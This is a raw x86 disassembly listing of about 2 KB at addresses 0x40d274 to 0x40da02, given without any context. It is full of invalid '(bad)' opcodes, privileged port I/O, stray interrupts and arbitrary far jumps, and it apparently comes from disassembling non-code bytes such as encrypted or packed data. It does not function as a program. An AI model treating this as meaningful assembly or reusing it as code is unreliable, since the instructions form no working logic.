  40d274:	mov    esp,0xf8cfe365
  40d279:	enter  0xd9de,0xf7
  40d27d:	adc    dh,BYTE PTR fs:[ebp+eiz*8-0x4f217570]
  40d285:	std    
  40d286:	enter  0x7802,0xca
  40d28a:	fisub  WORD PTR [eax+0x2a]
  40d28d:	data16 lahf 
  40d28f:	sbb    edi,ecx
  40d291:	jnp    0x40d2c6
  40d293:	and    esi,DWORD PTR [esi-0x4ae02009]
  40d299:	fimul  WORD PTR [eax+0x7481fef8]
  40d29f:	das    
  40d2a0:	cmp    BYTE PTR [esi+0x3679f67c],bl
  40d2a6:	sub    esp,ecx
  40d2a8:	arpl   WORD PTR [esi-0x7a],cx
  40d2ab:	mov    ebp,0x9e8e305d
  40d2b0:	inc    esi
  40d2b1:	mov    edi,0xb274056d
  40d2b6:	and    al,0xb6
  40d2b8:	push   0xcc36bf92
  40d2bd:	stos   BYTE PTR es:[edi],al
  40d2be:	std    
  40d2bf:	pop    esp
  40d2c0:	test   DWORD PTR [esi+0x5a],edx
  40d2c3:	dec    esp
  40d2c4:	xor    eax,0x6d4e9e4e
  40d2c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2ca:	(bad)  
  40d2cb:	and    eax,0x57aa3c10
  40d2d0:	outs   dx,BYTE PTR ds:[esi]
  40d2d1:	mov    DWORD PTR [ecx],ebx
  40d2d3:	fwait
  40d2d4:	(bad)  
  40d2d5:	aam    0x39
  40d2d7:	mov    dl,0x32
  40d2d9:	mov    bl,0xdd
  40d2db:	scas   al,BYTE PTR es:[edi]
  40d2dc:	push   ss
  40d2dd:	pop    ebx
  40d2de:	push   esp
  40d2df:	mov    BYTE PTR [ecx+ebx*8-0x24],al
  40d2e3:	pop    es
  40d2e4:	pusha  
  40d2e5:	jnp    0x40d2a8
  40d2e7:	dec    ecx
  40d2e8:	push   es
  40d2e9:	inc    eax
  40d2ea:	aas    
  40d2eb:	shr    ecx,1
  40d2ed:	cmp    DWORD PTR [esi+0xb],ecx
  40d2f0:	stos   DWORD PTR es:[edi],eax
  40d2f1:	mov    bh,BYTE PTR [edx-0x41]
  40d2f4:	mov    dl,0xb4
  40d2f6:	inc    ecx
  40d2f7:	out    dx,al
  40d2f8:	mov    ah,0x56
  40d2fa:	pop    edx
  40d2fb:	cdq    
  40d2fc:	mov    bh,al
  40d2fe:	adc    ecx,DWORD PTR ds:0xc7948111
  40d304:	test   al,0xc2
  40d306:	jecxz  0x40d33d
  40d308:	push   esp
  40d309:	leave  
  40d30a:	(bad)  
  40d30b:	xor    cl,BYTE PTR [edi+eiz*2-0x40538d3e]
  40d312:	stc    
  40d313:	in     al,0x8a
  40d315:	jmp    0xf2ac:0xf25e1d79
  40d31c:	push   ebx
  40d31d:	retf   
  40d31e:	inc    eax
  40d31f:	sbb    dl,BYTE PTR [edi+0x4d]
  40d322:	mov    dl,0x73
  40d324:	lock add esi,edx
  40d327:	ss mov bh,0xfd
  40d32a:	jmp    FWORD PTR [edx]
  40d32c:	retf   
  40d32d:	test   eax,0xbaf9fc14
  40d332:	fmul   DWORD PTR fs:[edi]
  40d335:	je     0x40d302
  40d337:	aaa    
  40d338:	cmp    eax,0xb1f80df3
  40d33d:	xor    DWORD PTR [ecx+edx*2-0x28],edi
  40d341:	push   ds
  40d342:	mov    edi,0xc90a6ad7
  40d347:	ror    BYTE PTR [esi+0x30941dd4],1
  40d34d:	out    dx,eax
  40d34e:	pusha  
  40d34f:	push   ebx
  40d350:	push   eax
  40d351:	push   ecx
  40d352:	lods   eax,DWORD PTR ds:[esi]
  40d353:	pop    esi
  40d354:	stos   BYTE PTR es:[edi],al
  40d355:	rol    BYTE PTR [edi+0x3e2357c9],0x68
  40d35c:	(bad)  
  40d35d:	loopne 0x40d325
  40d35f:	or     al,0x6a
  40d361:	pop    ebx
  40d362:	dec    esi
  40d363:	nop
  40d364:	sbb    ecx,edx
  40d366:	bound  eax,QWORD PTR [ebx-0x5a]
  40d369:	in     eax,0xae
  40d36b:	xchg   edx,eax
  40d36c:	jne    0x40d30f
  40d36e:	retf   0x5bca
  40d371:	test   DWORD PTR [ecx-0xeb95765],esi
  40d377:	pushf  
  40d378:	pop    es
  40d379:	add    al,0xbf
  40d37b:	add    bh,BYTE PTR [eax-0x4d9443f3]
  40d381:	les    edx,FWORD PTR [edx]
  40d383:	ds stos BYTE PTR es:[edi],al
  40d385:	das    
  40d386:	cmp    DWORD PTR [edx+eiz*2],0xcc098a37
  40d38d:	in     eax,0x13
  40d38f:	sub    BYTE PTR [ecx-0x2aaeca7d],dl
  40d395:	stc    
  40d396:	sub    edx,esi
  40d398:	xchg   DWORD PTR [ecx],ecx
  40d39a:	or     al,0xaa
  40d39c:	jo     0x40d345
  40d39e:	sti    
  40d39f:	out    0xd3,eax
  40d3a1:	sub    BYTE PTR [edi+0x23e9c098],cl
  40d3a7:	xor    BYTE PTR [esi+0xe363baf],dl
  40d3ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3ae:	popf   
  40d3af:	(bad)  
  40d3b0:	jge    0x40d364
  40d3b2:	jne    0x40d3d0
  40d3b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3b5:	sbb    dl,cl
  40d3b7:	add    dh,BYTE PTR [ecx+ebp*8+0x27fc5b5]
  40d3be:	sbb    BYTE PTR [ebp-0x3857037b],bl
  40d3c4:	sti    
  40d3c5:	sbb    al,dl
  40d3c7:	aad    0x9e
  40d3c9:	movntps XMMWORD PTR [ebp-0x258192f6],xmm2
  40d3d0:	sub    edi,ebx
  40d3d2:	int    0x3
  40d3d4:	sahf   
  40d3d5:	(bad)  
  40d3d7:	mov    ch,0x38
  40d3d9:	ret    
  40d3da:	pop    ss
  40d3db:	test   DWORD PTR [esi+0x7500f9b5],0x6725a9c0
  40d3e5:	imul   edi,DWORD PTR [eax],0xa852c4bf
  40d3eb:	jne    0x40d42e
  40d3ed:	call   0x7a88d63c
  40d3f2:	test   ch,dh
  40d3f4:	loop   0x40d40f
  40d3f6:	mov    WORD PTR [ecx+0x44],es
  40d3f9:	pop    ebp
  40d3fa:	sbb    BYTE PTR [edx-0x2c],bh
  40d3fd:	inc    esp
  40d3fe:	mov    esp,0x70e2620b
  40d403:	test   edi,esp
  40d405:	aaa    
  40d406:	out    0x71,eax
  40d408:	mov    bl,0xe1
  40d40a:	ins    BYTE PTR es:[edi],dx
  40d40b:	ins    DWORD PTR es:[edi],dx
  40d40c:	inc    ecx
  40d40d:	push   ebp
  40d40e:	jge    0x40d468
  40d410:	adc    BYTE PTR [ecx+0x57969a18],dh
  40d416:	xor    eax,0xc4aed0f3
  40d41b:	daa    
  40d41c:	bound  esi,QWORD PTR [edi-0x71]
  40d41f:	retf   0xd2ee
  40d422:	xchg   BYTE PTR [edi+0x595fbd35],dh
  40d428:	shr    BYTE PTR [ebx+ebp*1+0x603e0965],1
  40d42f:	cld    
  40d430:	fld    QWORD PTR [ecx]
  40d432:	cmp    eax,0x554f797b
  40d437:	sbb    edi,DWORD PTR [esi-0x2a]
  40d43a:	mov    eax,ds:0x13b4b44b
  40d43f:	lock dec edx
  40d441:	repnz push ebx
  40d443:	je     0x40d498
  40d445:	cmp    eax,0x88333c38
  40d44a:	fild   QWORD PTR [ebx-0x180f1dc7]
  40d450:	xchg   edx,eax
  40d451:	in     al,dx
  40d452:	stos   BYTE PTR es:[edi],al
  40d453:	pusha  
  40d454:	int    0x80
  40d456:	pop    ebp
  40d457:	jl     0x40d416
  40d459:	popf   
  40d45a:	sbb    BYTE PTR [ebp+edx*4-0x6e],cl
  40d45e:	mov    dh,bh
  40d460:	jle    0x40d410
  40d462:	call   0x20951f58
  40d467:	jae    0x40d449
  40d469:	imul   esp,DWORD PTR [ebx+0x2d8c43c3],0x56e44609
  40d473:	leave  
  40d474:	lea    edi,[edx]
  40d476:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d477:	push   esp
  40d478:	mov    ebp,0x8765189f
  40d47d:	xlat   BYTE PTR ds:[ebx]
  40d47e:	add    ebx,ecx
  40d480:	inc    ecx
  40d481:	cmp    DWORD PTR [edx+0x53d97eb3],edi
  40d487:	xchg   esi,eax
  40d488:	pop    ebp
  40d489:	push   cs
  40d48a:	outs   dx,BYTE PTR cs:[esi]
  40d48c:	(bad)  
  40d48d:	xor    al,0xef
  40d48f:	leave  
  40d490:	sub    DWORD PTR [esi+0x7c],edi
  40d493:	int    0xd1
  40d495:	loop   0x40d454
  40d497:	jae    0x40d50b
  40d499:	ss popa 
  40d49b:	mov    bh,BYTE PTR [ecx-0x5870b0f9]
  40d4a1:	sti    
  40d4a2:	ds dec ebp
  40d4a4:	dec    esi
  40d4a5:	mov    ds,WORD PTR fs:[edi]
  40d4a8:	loop   0x40d4bc
  40d4aa:	push   esi
  40d4ab:	shl    DWORD PTR [edi],0x7b
  40d4ae:	outs   dx,BYTE PTR ds:[esi]
  40d4af:	jbe    0x40d4a4
  40d4b1:	and    DWORD PTR [ebp+eiz*2+0x795197ed],esi
  40d4b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4b9:	or     edi,DWORD PTR [edx+ecx*2-0x416f4d88]
  40d4c0:	mov    ebx,DWORD PTR [edi]
  40d4c2:	(bad)
  40d4c5:	or     eax,0x7054f168
  40d4ca:	push   ebp
  40d4cb:	sub    BYTE PTR [ecx-0x18],ch
  40d4ce:	jge    0x40d4f6
  40d4d0:	repz mov eax,0x7696d401
  40d4d6:	push   ebp
  40d4d7:	mov    al,ds:0x95c0f041
  40d4dc:	sub    ah,BYTE PTR [ecx-0x5e20cb19]
  40d4e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4e3:	or     ebx,ebx
  40d4e5:	pop    eax
  40d4e6:	push   ecx
  40d4e7:	leave  
  40d4e8:	add    edx,0xffffffa2
  40d4eb:	gs inc ecx
  40d4ed:	data16 int3 
  40d4ef:	push   ecx
  40d4f0:	aas    
  40d4f1:	or     ch,0x5a
  40d4f4:	pop    es
  40d4f5:	sbb    DWORD PTR [ebp-0x1403363d],ebp
  40d4fb:	test   BYTE PTR [eax+0x31a60245],dh
  40d501:	std    
  40d502:	loope  0x40d57b
  40d504:	neg    cl
  40d506:	test   eax,0x2d38b2d7
  40d50b:	inc    eax
  40d50c:	sub    al,0xf8
  40d50e:	jno    0x40d518
  40d510:	shr    BYTE PTR [esi-0x2d6100e8],0x72
  40d517:	pop    ds
  40d518:	cmp    al,0x4b
  40d51a:	icebp  
  40d51b:	jb     0x40d4d6
  40d51d:	xor    edx,DWORD PTR [ebp+0x2871f5d4]
  40d523:	cmp    eax,0x4bbda6ad
  40d528:	ds push es
  40d52a:	clc    
  40d52b:	jg     0x40d52f
  40d52d:	pushf  
  40d52e:	leave  
  40d52f:	mov    bh,0xf2
  40d531:	repnz repnz fmul DWORD PTR [ebx+eiz*1+0x10]
  40d537:	(bad)  
  40d538:	sub    eax,0x3cb709c2
  40d53d:	inc    edi
  40d53e:	mul    DWORD PTR [esi]
  40d540:	pop    ss
  40d541:	jl     0x40d4fb
  40d543:	jbe    0x40d4e6
  40d545:	test   bl,al
  40d547:	ins    DWORD PTR es:[edi],dx
  40d548:	xchg   edi,eax
  40d549:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d54a:	sbb    dh,BYTE PTR [ebx-0x5c]
  40d54d:	cmp    DWORD PTR [edx-0x6db8d4a9],eax
  40d553:	enter  0xe7ae,0x3e
  40d557:	cmp    eax,0x86159782
  40d55c:	mov    al,ds:0x7fd8a83b
  40d561:	add    al,BYTE PTR [esp+eax*2+0x4f08f0d8]
  40d568:	out    dx,al
  40d569:	xchg   esi,eax
  40d56a:	ffree  st(5)
  40d56c:	dec    edx
  40d56d:	inc    eax
  40d56e:	add    BYTE PTR [ebp+0x36ef0d52],ch
  40d574:	mov    bh,0xdf
  40d576:	jge    0x40d529
  40d578:	fisub  WORD PTR [eax*8-0x714d075b]
  40d57f:	loop   0x40d5a4
  40d581:	add    ebx,DWORD PTR [eax+0x6c]
  40d584:	inc    ebx
  40d585:	addr16 retf 0xb0f
  40d589:	add    BYTE PTR [edx],dl
  40d58b:	shr    edx,cl
  40d58d:	bound  ebx,QWORD PTR [esi-0x2c]
  40d590:	shr    DWORD PTR [edx],1
  40d592:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d593:	arpl   dx,cx
  40d595:	popa   
  40d596:	in     eax,dx
  40d597:	dec    esp
  40d598:	gs sub al,0x6d
  40d59b:	adc    eax,0x362060f7
  40d5a0:	cmp    DWORD PTR [edx+ebx*4+0x4],ebx
  40d5a4:	and    eax,0xe484caa3
  40d5a9:	mov    eax,0xb429735e
  40d5ae:	xchg   edi,ebx
  40d5b0:	icebp  
  40d5b1:	mov    bl,0x69
  40d5b3:	mov    DWORD PTR [ebx+0x53],eax
  40d5b6:	and    al,0x87
  40d5b8:	data16 mov ds:0x2596afc6,al
  40d5be:	daa    
  40d5bf:	shr    DWORD PTR [ecx],cl
  40d5c1:	(bad)  
  40d5c3:	or     eax,0x64976c5f
  40d5c8:	jae    0x40d63a
  40d5ca:	inc    ebx
  40d5cb:	adc    esp,eax
  40d5cd:	pop    ecx
  40d5ce:	mov    ds:0xa55632b9,al
  40d5d3:	and    al,0xcd
  40d5d5:	xor    al,0x52
  40d5d7:	imul   esi,DWORD PTR [ecx+0x3305eafc],0xffffffa3
  40d5de:	test   DWORD PTR [ebx-0x67],esp
  40d5e1:	rol    BYTE PTR [edi+0x53bc3431],0x3c
  40d5e8:	and    BYTE PTR [edx],bl
  40d5ea:	push   0xffffff85
  40d5ec:	aaa    
  40d5ed:	mov    ebx,ss
  40d5ef:	sub    BYTE PTR [ecx],0xef
  40d5f2:	pop    eax
  40d5f3:	fisub  DWORD PTR [ebp+0x68]
  40d5f6:	adc    DWORD PTR [esp+ebx*4+0x2215d550],0x72685e8c
  40d601:	inc    esp
  40d602:	jl     0x40d5a5
  40d604:	jbe    0x40d59f
  40d606:	xchg   ecx,eax
  40d607:	sbb    eax,0xd58c82d1
  40d60c:	push   edx
  40d60d:	xor    DWORD PTR [esi+0x470c3ad9],esp
  40d613:	ja     0x40d68d
  40d615:	jo     0x40d626
  40d617:	push   0x6a
  40d619:	std    
  40d61a:	out    dx,al
  40d61b:	mov    ds:0xc5bdfbeb,al
  40d620:	sahf   
  40d621:	dec    esi
  40d622:	dec    edx
  40d623:	sti    
  40d624:	int3   
  40d625:	add    ch,BYTE PTR [ecx+0x1acfbcdb]
  40d62b:	dec    ebx
  40d62c:	addr16 pop ecx
  40d62e:	sbb    bh,bl
  40d630:	ins    BYTE PTR es:[edi],dx
  40d631:	pop    edx
  40d632:	push   ebx
  40d633:	add    dl,BYTE PTR [ebx+eax*8]
  40d636:	xchg   edi,eax
  40d637:	pop    ds
  40d638:	or     bh,BYTE PTR [edx]
  40d63a:	mov    eax,ds:0x36340d5f
  40d63f:	rcr    dh,1
  40d641:	clc    
  40d642:	pusha  
  40d643:	xor    BYTE PTR [ebx+0xe4b07a5],dh
  40d649:	inc    esi
  40d64a:	lods   eax,DWORD PTR ds:[esi]
  40d64b:	adc    eax,esp
  40d64d:	push   ds
  40d64e:	(bad)  
  40d64f:	daa    
  40d650:	mov    esp,?
  40d652:	pusha  
  40d653:	rep outs dx,BYTE PTR ds:[esi]
  40d655:	cmp    BYTE PTR [eax],cl
  40d657:	sbb    al,0x34
  40d659:	es dec esp
  40d65b:	pop    ds
  40d65c:	fs inc esp
  40d65e:	mov    bh,bl
  40d660:	shl    DWORD PTR [ecx],1
  40d662:	xchg   DWORD PTR [eax+edi*4-0xd],esi
  40d666:	push   cs
  40d667:	leave  
  40d668:	cli    
  40d669:	add    al,BYTE PTR ds:0xcd18f62c
  40d66f:	ror    dh,0x66
  40d672:	pop    ebx
  40d673:	sbb    ah,BYTE PTR [edx+0x3f]
  40d676:	pop    ebp
  40d677:	mov    bl,dh
  40d679:	aad    0x6e
  40d67b:	out    dx,eax
  40d67c:	cmp    BYTE PTR [eax+esi*1-0x4f0bcaea],bh
  40d683:	aas    
  40d684:	out    0x89,al
  40d686:	mul    BYTE PTR [ebx+0x38]
  40d689:	mov    ebp,0x71ca7293
  40d68e:	imul   esp,ebx,0xffffffc6
  40d691:	jno    0x40d6bd
  40d693:	xchg   ebp,ebp
  40d695:	(bad)  
  40d696:	in     eax,dx
  40d697:	xor    eax,0x7a00d67e
  40d69c:	pop    edi
  40d69d:	aas    
  40d69e:	mov    al,ds:0xacbf3ec8
  40d6a3:	xchg   DWORD PTR [eax-0x55f03878],ebp
  40d6a9:	mov    ebx,0x1ea6f364
  40d6ae:	out    dx,al
  40d6af:	hlt    
  40d6b0:	mov    edi,0xf75c4a03
  40d6b5:	popa   
  40d6b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6b7:	xor    al,0xde
  40d6b9:	add    al,0xa2
  40d6bb:	shl    edx,0x68
  40d6be:	mov    DWORD PTR [ebp+edx*1+0x1bd28496],ebx
  40d6c5:	inc    ebp
  40d6c6:	mov    eax,ds:0x7cd45385
  40d6cb:	xor    eax,0x8a2d3d90
  40d6d0:	mov    dh,0xf8
  40d6d2:	repz sar DWORD PTR [eax],0xe8
  40d6d6:	fcmovb st,st(1)
  40d6d8:	sub    edx,ebx
  40d6da:	sbb    al,bl
  40d6dc:	or     eax,0xf3dea9f1
  40d6e1:	jbe    0x40d74f
  40d6e3:	xor    eax,0x620b9d4
  40d6e8:	leave  
  40d6e9:	xchg   ecx,edi
  40d6eb:	fsub   QWORD PTR [esi-0x6ea3c8b8]
  40d6f1:	mov    edi,0x573695b8
  40d6f7:	mov    esp,0xa6b4d740
  40d6fc:	xor    al,0x76
  40d6fe:	ret    0x28ee
  40d701:	add    al,0xb7
  40d703:	cmp    eax,0x8c2f0f97
  40d708:	inc    edx
  40d709:	out    0xda,eax
  40d70b:	adc    cl,BYTE PTR [eax]
  40d70d:	sub    al,0xee
  40d70f:	mov    ecx,0x1ff2ee72
  40d714:	cs push ebx
  40d716:	ja     0x40d762
  40d718:	add    DWORD PTR [eax+edi*4-0x32f15ba2],eax
  40d71f:	xor    eax,eax
  40d721:	inc    ebp
  40d722:	inc    ebx
  40d723:	pushf  
  40d724:	mov    al,0xb9
  40d726:	xchg   ecx,ecx
  40d728:	ss std 
  40d72a:	cdq    
  40d72b:	xchg   ebp,eax
  40d72c:	js     0x40d743
  40d72e:	addr16 pop ds
  40d730:	ins    DWORD PTR es:[edi],dx
  40d731:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d732:	pop    edi
  40d733:	pop    es
  40d734:	lods   al,BYTE PTR ds:[esi]
  40d735:	mov    dh,BYTE PTR [eax+0x156c1bba]
  40d73b:	or     edx,DWORD PTR [esi-0x7df76020]
  40d741:	jle    0x40d78d
  40d743:	sar    BYTE PTR [edx+0x5681e759],1
  40d749:	pushf  
  40d74a:	mov    edi,DWORD PTR [ebx+eiz*8]
  40d74d:	xchg   ecx,edx
  40d74f:	dec    ebp
  40d750:	jl     0x40d6d2
  40d752:	mov    ebx,0xfea3e07c
  40d757:	mov    edx,0xcd9ad655
  40d75c:	adc    al,0xeb
  40d75e:	sbb    bl,bh
  40d760:	or     eax,0x7fee7af7
  40d765:	or     BYTE PTR [edi+0x5ee2b0ce],0x4
  40d76c:	and    BYTE PTR [ebp-0x75f889bb],0xda
  40d773:	mov    gs,eax
  40d775:	inc    edi
  40d776:	jl     0x40d7ac
  40d778:	bound  ebx,QWORD PTR [ebp-0x33]
  40d77b:	popa   
  40d77c:	in     al,0x95
  40d77e:	mov    bh,dl
  40d780:	shl    ch,0x27
  40d783:	inc    ecx
  40d784:	mov    eax,0x82fb07aa
  40d789:	or     cl,BYTE PTR [eax]
  40d78b:	shl    DWORD PTR [edx-0x7668b143],0x49
  40d792:	dec    edx
  40d793:	xor    esp,DWORD PTR [eax+0x5c]
  40d796:	mov    ah,BYTE PTR [ecx+edx*2-0x12e96b94]
  40d79d:	adc    ebp,ecx
  40d79f:	neg    BYTE PTR [edx]
  40d7a1:	xlat   BYTE PTR ds:[ebx]
  40d7a2:	stc    
  40d7a3:	(bad)  
  40d7a5:	jb     0x40d777
  40d7a7:	or     dl,BYTE PTR [esi+0x7a]
  40d7aa:	pop    edi
  40d7ab:	neg    BYTE PTR [esi+edx*1-0x1f26fb8]
  40d7b2:	addr16 add al,0xa4
  40d7b5:	xor    eax,0xb16dde19
  40d7ba:	xor    bh,BYTE PTR [eax]
  40d7bc:	push   es
  40d7bd:	(bad)  
  40d7be:	cmp    edi,DWORD PTR [ebx-0x65]
  40d7c1:	lods   al,BYTE PTR ds:[esi]
  40d7c2:	out    0x57,al
  40d7c4:	jmp    0x40d78a
  40d7c6:	pop    ds
  40d7c7:	fucomp st(4)
  40d7c9:	push   esi
  40d7ca:	(bad)  
  40d7cb:	mov    bh,0xb3
  40d7cd:	or     ebx,DWORD PTR [edi]
  40d7cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7d0:	jno    0x40d7b3
  40d7d2:	dec    eax
  40d7d3:	int3   
  40d7d4:	rcl    DWORD PTR [esi],0x10
  40d7d7:	add    al,0x7a
  40d7d9:	int    0xa3
  40d7db:	inc    ebp
  40d7dc:	repnz enter 0xa2d,0x55
  40d7e1:	fdivr  QWORD PTR [ebp+0x89d2957]
  40d7e7:	mov    ecx,0xddd516f0
  40d7ec:	push   ecx
  40d7ed:	xchg   ebx,eax
  40d7ee:	push   ebx
  40d7ef:	sahf   
  40d7f0:	inc    esi
  40d7f1:	outs   dx,DWORD PTR ds:[esi]
  40d7f2:	jmp    0x5592:0xf7c03c36
  40d7f9:	mov    bh,0x27
  40d7fb:	lds    esi,FWORD PTR [ebp+0x6]
  40d7fe:	mov    edx,DWORD PTR [ebx]
  40d800:	jbe    0x40d829
  40d802:	fdivr  DWORD PTR [edi+0x6c]
  40d805:	mov    DWORD PTR [eax],0x20838de3
  40d80b:	pushf  
  40d80c:	clc    
  40d80d:	ins    DWORD PTR es:[edi],dx
  40d80e:	repz cmp ebx,DWORD PTR [ecx+0x6a]
  40d812:	fwait
  40d813:	dec    eax
  40d814:	stos   BYTE PTR es:[edi],al
  40d815:	lock jg 0x40d7ad
  40d818:	jnp    0x40d7e9
  40d81a:	ss adc al,0xe3
  40d81d:	ins    DWORD PTR es:[edi],dx
  40d81e:	mov    ecx,0xe4b09454
  40d823:	mov    edx,0xb39f1efd
  40d828:	add    esp,DWORD PTR fs:[edx-0x46519fef]
  40d82f:	icebp  
  40d830:	mov    bl,0x36
  40d832:	sbb    DWORD PTR [edi+0x597177d2],esp
  40d838:	jno    0x40d7c7
  40d83a:	mov    al,ds:0xcf86995c
  40d83f:	adc    eax,0x5e9fd8e1
  40d844:	rcr    DWORD PTR [ecx+0x6647d5bb],cl
  40d84a:	push   ebx
  40d84b:	stos   DWORD PTR es:[edi],eax
  40d84c:	inc    edx
  40d84d:	push   esi
  40d84e:	cmp    eax,0x44f401c2
  40d853:	pop    edi
  40d854:	scas   eax,DWORD PTR es:[edi]
  40d855:	into   
  40d856:	adc    DWORD PTR [edi+eax*1+0x40],0x14
  40d85b:	rcl    ecx,0xcf
  40d85e:	aas    
  40d85f:	repz jmp 0x7963:0xac0426fa
  40d867:	ds (bad) 
  40d869:	popa   
  40d86a:	sbb    edx,esi
  40d86c:	mov    ds:0x776f80d8,eax
  40d871:	int3   
  40d872:	or     al,0xf6
  40d874:	pop    es
  40d875:	(bad)  
  40d876:	xchg   edi,eax
  40d877:	ret    
  40d878:	sar    al,1
  40d87a:	jnp    0x40d875
  40d87c:	mov    cl,0xb3
  40d87e:	inc    esi
  40d87f:	pop    es
  40d880:	inc    eax
  40d881:	fsubr  QWORD PTR [ebx+ebx*2]
  40d884:	pop    ds
  40d885:	lahf   
  40d886:	mov    dh,0x7c
  40d888:	adc    ch,BYTE PTR [eax-0x7b]
  40d88b:	mov    esp,0x79303cbc
  40d890:	xor    DWORD PTR [esi+0x77],esp
  40d893:	mov    ds:0xb1e0f902,al
  40d898:	sbb    DWORD PTR [ebx+0x5fac63d4],edx
  40d89e:	aas    
  40d89f:	imul   ecx,DWORD PTR [edi+edi*4-0x23],0x1520acbd
  40d8a7:	mov    esi,0xeb0eb2f5
  40d8ac:	cwde   
  40d8ad:	fcmovne st,st(1)
  40d8af:	push   0xac7a32ce
  40d8b4:	cmp    eax,0x70f3c6db
  40d8b9:	(bad)
  40d8bc:	ret    0xc7d1
  40d8bf:	push   es
  40d8c0:	cmp    BYTE PTR [ebx-0x7081a60e],0xdc
  40d8c7:	push   ecx
  40d8c8:	dec    ebx
  40d8c9:	outs   dx,BYTE PTR ds:[esi]
  40d8ca:	loope  0x40d8f8
  40d8cc:	jl     0x40d88e
  40d8ce:	add    BYTE PTR [edi+0x3add6f9d],al
  40d8d4:	inc    edx
  40d8d5:	add    ecx,DWORD PTR [edi-0x1a]
  40d8d8:	test   eax,0xe9cbcc56
  40d8dd:	test   eax,0x4a6be961
  40d8e2:	inc    edi
  40d8e3:	cs jnp 0x40d86e
  40d8e6:	and    al,0x7b
  40d8e8:	xor    BYTE PTR [eax+0x4e9013d5],0x29
  40d8ef:	pop    ss
  40d8f0:	mov    esp,0xe849e217
  40d8f5:	xchg   esi,eax
  40d8f6:	xchg   edi,eax
  40d8f7:	retf   
  40d8f8:	lahf   
  40d8f9:	fsub   QWORD PTR [edx-0x6]
  40d8fc:	sub    ebx,DWORD PTR [edi]
  40d8fe:	push   cs
  40d8ff:	lods   al,BYTE PTR ds:[esi]
  40d900:	call   esp
  40d902:	cmp    DWORD PTR [ebx-0x405adcc],0x6d
  40d909:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d90a:	dec    ecx
  40d90b:	push   es
  40d90c:	jmp    0x40d92c
  40d90e:	push   esp
  40d90f:	push   ebx
  40d910:	adc    eax,0xfb04ded3
  40d915:	mov    cl,0x45
  40d917:	lea    ecx,[edi]
  40d919:	add    BYTE PTR [edi],dl
  40d91b:	jns    0x40d935
  40d91d:	push   cs
  40d91e:	cs push ecx
  40d920:	or     al,0xbf
  40d922:	mov    esp,0xcfc4321
  40d927:	add    BYTE PTR [edx],dh
  40d929:	sahf   
  40d92a:	mov    ds:0x1650fff6,al
  40d92f:	popf   
  40d930:	rcr    BYTE PTR [ebx],1
  40d932:	mov    edx,0xd3686cc9
  40d937:	mov    esp,0x1709148c
  40d93c:	sub    DWORD PTR [ebx-0x65],ebx
  40d93f:	xchg   ebp,eax
  40d940:	xchg   edx,eax
  40d941:	jg     0x40d8cc
  40d943:	outs   dx,BYTE PTR ds:[esi]
  40d944:	hlt    
  40d945:	lea    eax,[edi+0xbd9a14f]
  40d94b:	out    0xeb,al
  40d94d:	lods   eax,DWORD PTR ds:[esi]
  40d94e:	or     ah,cl
  40d950:	inc    edx
  40d951:	inc    esp
  40d952:	retf   
  40d953:	stc    
  40d954:	pop    ecx
  40d955:	sbb    eax,0xc0f0077
  40d95a:	jb     0x40d975
  40d95c:	shl    BYTE PTR [edi-0x692ce987],cl
  40d962:	call   0x1eaa:0x99982f5f
  40d969:	push   edx
  40d96a:	sbb    BYTE PTR [ecx+edi*2-0x5dd1ae55],bh
  40d971:	outs   dx,DWORD PTR ds:[esi]
  40d972:	pop    ebp
  40d973:	sbb    eax,0x613d6aac
  40d978:	cs shr ah,0x8b
  40d97c:	out    dx,eax
  40d97d:	bnd jl 0x40d92f
  40d980:	lods   al,BYTE PTR ds:[esi]
  40d981:	jnp    0x40d95c
  40d983:	or     ebx,eax
  40d985:	bound  ebp,QWORD PTR [ecx]
  40d987:	adc    edi,DWORD PTR [esi+0x73ca001e]
  40d98d:	imul   ecx,DWORD PTR [edx-0x3b],0xffffffc0
  40d991:	pop    eax
  40d992:	popf   
  40d993:	adc    DWORD PTR [eax-0x50499c31],esi
  40d999:	pop    esi
  40d99a:	dec    edi
  40d99b:	add    edx,DWORD PTR [edx-0x282ec30c]
  40d9a1:	dec    esp
  40d9a2:	mov    eax,ds:0x32c78956
  40d9a7:	mov    esp,0xff209dcb
  40d9ac:	ret    0x1614
  40d9af:	fisttp QWORD PTR [edx]
  40d9b1:	fwait
  40d9b2:	push   ebx
  40d9b3:	dec    BYTE PTR [edi-0x8868d6]
  40d9b9:	neg    DWORD PTR [ecx]
  40d9bb:	mov    eax,DWORD PTR [esi+0x51]
  40d9be:	jge    0x40d952
  40d9c0:	dec    ecx
  40d9c1:	sub    eax,0xfc852376
  40d9c6:	or     dh,BYTE PTR [esi]
  40d9c8:	xchg   esi,eax
  40d9c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9ca:	lahf   
  40d9cb:	js     0x40d9e3
  40d9cd:	xchg   esi,eax
  40d9ce:	sub    DWORD PTR [esi+0xaa74ce3],esp
  40d9d4:	pop    ss
  40d9d5:	jle    0x40da3d
  40d9d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9d8:	mov    esp,DWORD PTR [edx+esi*4]
  40d9db:	int3   
  40d9dc:	and    eax,0x49534d99
  40d9e1:	(bad)  
  40d9e2:	out    0x81,al
  40d9e4:	add    esp,ebx
  40d9e6:	loopne 0x40d9db
  40d9e8:	jno    0x40da11
  40d9ea:	call   FWORD PTR [edi-0x34c1a16b]
  40d9f0:	or     bl,dh
  40d9f2:	mov    BYTE PTR [edx+0x6f3917a2],ah
  40d9f8:	fwait
  40d9f9:	push   ss
  40d9fa:	inc    edi
  40d9fb:	xchg   esp,eax
  40d9fc:	fcomp  DWORD PTR [ebp+0x29fd9a12]
  40da02:	lods   eax,DWORD PTR fs:[esi]
